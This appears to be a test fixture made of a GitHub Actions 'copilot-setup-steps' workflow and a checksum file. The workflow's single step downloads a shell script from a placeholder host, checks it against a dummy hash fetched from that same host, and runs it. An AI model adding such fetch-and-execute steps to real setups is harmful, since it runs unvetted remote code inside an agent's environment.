-- .github/workflows/copilot-setup-steps.yml --
on: workflow_dispatch
jobs:
  copilot-setup-steps:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: step0
        run: "curl -fsSLo i.sha https://get.tools.example.invalid/i.sha && curl -fsSLo i.sh https://get.tools.example.invalid/i.sh && sha256sum -c i.sha && sh i.sh"
-- i.sha --
abababababababababababababababababababababababababababababababab  i.sh
